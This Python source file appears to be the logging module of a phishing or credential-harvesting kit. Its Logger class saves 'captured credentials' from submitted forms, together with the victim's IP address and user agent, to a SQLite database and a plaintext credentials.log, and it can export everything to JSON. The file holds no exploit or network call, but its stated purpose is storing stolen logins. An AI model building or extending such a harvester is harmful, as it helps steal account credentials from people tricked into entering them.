"""
Logger — saves captured credentials to SQLite3.
Also appends to a human-readable credentials.log file.
"""

import os
import json
import sqlite3
import time

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "..", "output")
DB_PATH = os.path.join(OUTPUT_DIR, "credentials.db")
LOG_PATH = os.path.join(OUTPUT_DIR, "credentials.log")


class Logger:
    def __init__(self):
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        self._init_db()

    def _init_db(self):
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS captures (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                ip        TEXT,
                user_agent TEXT,
                field     TEXT NOT NULL,
                value     TEXT NOT NULL
            )
        """)
        conn.commit()
        conn.close()

    def save(self, data: dict, ip: str = "", user_agent: str = ""):
        """Save all key-value pairs from a captured form submission."""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        conn = sqlite3.connect(DB_PATH)
        rows = []
        log_lines = [f"\n[{timestamp}] IP={ip}"]

        for field, value in data.items():
            if value:
                rows.append((timestamp, ip, user_agent, field, str(value)))
                log_lines.append(f"  {field}: {value}")

        if rows:
            conn.executemany(
                "INSERT INTO captures (timestamp, ip, user_agent, field, value) VALUES (?,?,?,?,?)",
                rows
            )
            conn.commit()

        conn.close()

        # Also write plaintext log
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write("\n".join(log_lines) + "\n")

    def get_all(self) -> list[dict]:
        """Return all captured entries as a list of dicts."""
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            "SELECT timestamp, ip, field, value FROM captures ORDER BY id DESC"
        ).fetchall()
        conn.close()
        return [dict(r) for r in rows]

    def count(self) -> int:
        conn = sqlite3.connect(DB_PATH)
        n = conn.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
        conn.close()
        return n

    def export_json(self, path: str):
        """Export all captures to a JSON file."""
        data = self.get_all()
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[+] Exported {len(data)} entries to {path}")
